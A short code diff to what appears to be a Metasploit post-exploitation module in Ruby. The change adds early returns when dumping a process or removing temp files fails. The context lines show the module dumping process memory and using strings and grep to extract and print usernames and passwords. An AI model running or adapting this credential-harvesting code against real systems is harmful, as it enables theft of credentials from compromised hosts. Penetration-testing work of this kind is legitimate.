@@ -62,6 +62,7 @@ class Metasploit4 < Msf::Post
       vprint_good('Succesfully dump.')
     else
       print_warning('Could not dump process.')
+      return
     end
 
     strings = cmd_exec("/usr/bin/strings #{tmp_path}*.dump | /bin/grep -B2 KnOQ  | /bin/grep -v KnOQ | /usr/bin/column | /usr/bin/awk '{print \"User: \"$1\"\\nPass: \"$2}'")
@@ -71,6 +72,7 @@ class Metasploit4 < Msf::Post
       vprint_good('Removing temp files successfully.')
     else
       print_warning('Could not remove dumped files.')
+      return
     end
 
     fail_with(Failure::BadConfig, 'No credentials. You can check if the PID is correct.') if strings.empty?
